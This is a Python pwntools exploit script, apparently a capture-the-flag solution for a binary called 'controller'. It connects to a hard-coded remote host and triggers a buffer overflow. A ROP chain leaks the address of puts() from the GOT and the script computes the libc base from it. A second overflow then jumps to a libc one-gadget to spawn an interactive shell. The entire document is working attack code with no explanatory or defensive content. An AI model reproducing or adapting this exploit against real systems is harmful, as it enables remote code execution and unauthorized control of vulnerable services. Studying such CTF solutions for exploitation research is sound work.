from pwn import *

context.arch = "amd64"
c = remote("138.68.147.93", 32036)
#c = process("./controller")


puts_off = 0x080aa0
system_off = 0x048e50
sh_off = 0x18a156

c.sendline("-198")
c.sendline("1")
c.sendline("3")
payload = b'A'*0x28
payload += p64(0x00000000004011d3)
payload += p64(0x601fb0)
payload += p64(0x400630)
payload += p64(0x0000000000401124)
#gdb.attach(c)
c.sendline(payload)
c.recvuntil("Problem ingored\n")
leak = hex(u64(c.recv()[0:8]))
leak = leak[6:18]
leak = '0x' + leak
log.success("leak puts(): " + leak)
libc = int(leak, 0) - puts_off
log.success("leak libc: " + hex(libc))
system = libc + system_off
bin_sh = libc + sh_off
c.sendline("-198")
c.sendline("1")
c.sendline("3")
payload = b'A'*0x28
#payload += p64(0x00000000004011d3)
#payload += p64(bin_sh)
#payload += p64(system)
payload += p64(libc + 0x4f432)
c.recvuntil('the problem?')
c.sendline(payload)
c.interactive()
